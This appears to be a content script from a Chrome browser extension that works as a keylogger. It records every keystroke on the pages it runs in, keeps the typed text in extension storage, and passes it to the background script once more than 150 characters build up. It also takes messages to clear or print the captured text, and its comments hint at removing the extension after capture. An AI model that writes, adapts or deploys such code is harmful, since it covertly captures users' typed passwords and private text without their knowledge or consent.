console.log("content script loaded"); //comment it out if not needed


var setBar = 150; //set after how many chars you want to delete this extension
chrome.storage.local.get(['storedIn'], (result) => {
  var value = result.storedIn;


  document.addEventListener('keydown', (event) => {
    value += event.key;
    chrome.storage.local.set({ storedIn: value });
    //remove if part if deletion not needed
    if (value.length > setBar) {
      chrome.runtime.sendMessage({ string: value, type: "completion" });
    }

  });

  chrome.runtime.onMessage.addListener(event => {
    if (event.type === "clearstr") {
      value = "";
      chrome.storage.local.set({ storedIn: value });
      console.log("storedIn has been emptied thanks"); //comment it out if not needed
    }
    else if (event.type === "showstr") {
      chrome.storage.local.get(['storedIn'], (result2) => {
        console.log(result2);

      });
    }
  });

});